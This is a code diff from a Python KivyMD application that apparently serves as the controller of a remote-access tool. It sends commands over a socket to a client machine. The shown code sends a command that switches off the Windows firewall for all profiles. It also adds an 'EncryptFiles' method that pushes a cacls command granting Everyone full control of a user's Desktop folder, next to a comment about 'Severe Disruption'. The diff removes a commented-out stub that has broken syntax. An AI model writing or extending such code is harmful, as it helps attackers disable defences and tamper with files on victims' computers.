@@ -291,7 +291,6 @@ class Main(MDApp):
             #Reset console
             self.root.ids.consoleField.text = ''
             
-            command = "C:\WINDOWS\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p"
             command = "netsh advfirewall set allprofiles state off"
             self.currConn.send(command.encode())
             print('[+] Command sent')
@@ -300,21 +299,14 @@ class Main(MDApp):
             self.root.ids.consoleField.text = output
             break
 
-##    def EncryptFiles(self):
-##        while True:
-##            command = 'cd C:\\Users\\%USERNAME%\\Desktop\\Test'
-##            self.currConn.send(command.encode())
-##            print('Command sent to client: ', command)
-##            
-##            command = 'dir'
-##            self.currConn.send(command.encode())
-##            print('Command sent to client: ', command)
-##            output = self.currConn.recv(8096).decode()
-##            print('Output: ', output)
-##
-##            for(i in output):
-##                print(i)
-##                command = 'icacls ' + i 
+    def EncryptFiles(self):
+        while True:
+            command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:f'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            
+            output = self.currConn.recv(8096).decode()
+            print('Output: ', output)
 
     #Zees Severe Disruption
     # File Creation Disruption
